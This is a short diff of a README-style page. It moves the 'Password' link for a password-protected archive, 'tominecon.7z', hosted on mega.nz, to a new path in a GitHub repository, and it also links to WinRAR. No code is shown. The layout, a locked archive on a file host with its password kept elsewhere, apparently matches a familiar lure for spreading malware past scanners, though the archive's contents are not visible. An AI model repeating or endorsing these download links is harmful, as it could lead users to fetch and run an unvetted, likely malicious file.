@@ -6,7 +6,7 @@
    
   Download: [tominecon.7z](https://mega.nz/file/TjYhGDYR#rA0DEzVsJe5TTerlTgjpSsmPFUnIZJp4m4CxfkVGHYY)
 
-  Password: [Click here](https://raw.githubusercontent.com/MrSPeeDy0/tominecon.7z/main/Password.txt)
+  Password: [Click here](https://raw.githubusercontent.com/MrSPeeDy0/tominecon.7z/main/Assets/Password.txt)
   
   WinRar : [Click here](https://www.win-rar.com/download.html?&L=0)
 
